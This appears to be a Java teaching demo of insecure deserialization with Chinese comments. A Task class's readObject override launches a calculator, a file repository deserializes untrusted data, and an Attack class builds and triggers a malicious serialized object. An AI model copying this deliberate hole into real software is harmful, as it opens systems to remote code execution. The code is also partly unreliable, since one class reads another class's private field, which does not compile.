package com.example.taskmanager.domain;

import java.io.*;
import java.util.ArrayList;
import java.util.List;

// 领域模型
public class Task implements Serializable {
    private String id;
    private String title;
    private transient List<String> auditLog = new ArrayList<>();

    public Task(String id, String title) {
        this.id = id;
        this.title = title;
    }

    // 恶意代码执行点：重写readObject方法
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟审计日志记录（实际可能执行任意代码）
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            Runtime.getRuntime().exec("calc.exe"); // Windows计算器示例
        } else {
            Runtime.getRuntime().exec("/usr/bin/open -a Calculator"); // macOS示例
        }
    }
}

// 仓储接口
interface TaskRepository {
    Task loadTask(String id) throws Exception;
    void saveTask(Task task) throws Exception;
}

// 不安全的文件仓储实现
class FileTaskRepository implements TaskRepository {
    private String storagePath;

    public FileTaskRepository(String storagePath) {
        this.storagePath = storagePath;
    }

    @Override
    public Task loadTask(String id) throws Exception {
        // 漏洞触发点：反序列化不可信数据
        try (ObjectInputStream in = new ObjectInputStream(
                new FileInputStream(storagePath + "/" + id + ".dat"))) {
            return (Task) in.readObject(); // 不安全的反序列化
        }
    }

    @Override
    public void saveTask(Task task) throws Exception {
        try (ObjectOutputStream out = new ObjectOutputStream(
                new FileOutputStream(storagePath + "/" + task.id + ".dat"))) {
            out.writeObject(task);
        }
    }
}

// 应用服务
class TaskService {
    private TaskRepository repository;

    public TaskService(TaskRepository repository) {
        this.repository = repository;
    }

    public Task getTask(String id) throws Exception {
        return repository.loadTask(id);
    }
}

// 恶意攻击演示
class Attack {
    public static void main(String[] args) {
        try {
            // 创建恶意序列化文件
            try (ObjectOutputStream out = new ObjectOutputStream(
                    new FileOutputStream("malicious.dat"))) {
                // 构造恶意对象（实际攻击中会包含完整gadget链）
                Object malicious = new Task("1", "Pwned") {
                    private void readObject(ObjectInputStream in) {
                        try {
                            in.defaultReadObject();
                            Runtime.getRuntime().exec("calc.exe");
                        } catch (Exception e) {}
                    }
                };
                out.writeObject(malicious);
            }

            // 漏洞利用演示
            TaskRepository repo = new FileTaskRepository(".");
            System.out.println("[+] 正常反序列化：");
            repo.loadTask("malicious"); // 触发计算器
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}